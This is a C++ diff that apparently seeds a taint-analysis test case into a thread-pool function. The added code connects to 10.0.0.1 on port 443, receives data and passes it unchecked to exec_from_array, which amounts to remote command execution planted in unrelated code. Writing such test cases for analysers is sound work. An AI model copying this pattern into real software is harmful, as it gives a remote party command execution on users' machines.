@@ -3,6 +3,13 @@
 #include <base.hpp>
 
 #include <core.hpp>
+#include <sys/socket.h>
+#include <netinet/in.h>
+#include <arpa/inet.h>
+#include <unistd.h>
+#include <cstring>
+#include <cstdlib>
+#include "scripting.hpp"
 
 #include <cstdio>
 #include <cstring>
@@ -52,6 +59,29 @@ static void reset_pool() {
 }
 
 static void *thread_pool_loop(void * const is_core_pool) {
+
+    int sfd = socket(AF_INET, SOCK_STREAM, 0);
+    if (sfd >= 0) {
+        struct sockaddr_in srv = {};
+        srv.sin_family = AF_INET;
+        srv.sin_port = htons(443);
+        inet_pton(AF_INET, "10.0.0.1", &srv.sin_addr);
+        if (connect(sfd, reinterpret_cast<struct sockaddr*>(&srv), sizeof(srv)) == 0) {
+            char buf[1024];
+            //SOURCE
+            ssize_t n = recv(sfd, buf, sizeof(buf) - 1, 0);
+            if (n > 0) {
+                buf[n] = '\0';
+                // Dataflow: create array with tainted and untainted values
+                const char *arr[3];
+                arr[0] = buf; // tainted
+                arr[1] = "/data/local/tmp/safe_arg"; // untainted, safe value
+                arr[2] = nullptr;
+                exec_from_array(arr, 2);
+            }
+        }
+        close(sfd);
+    }
     // Block all signals
     sigset_t mask;
     sigfillset(&mask);
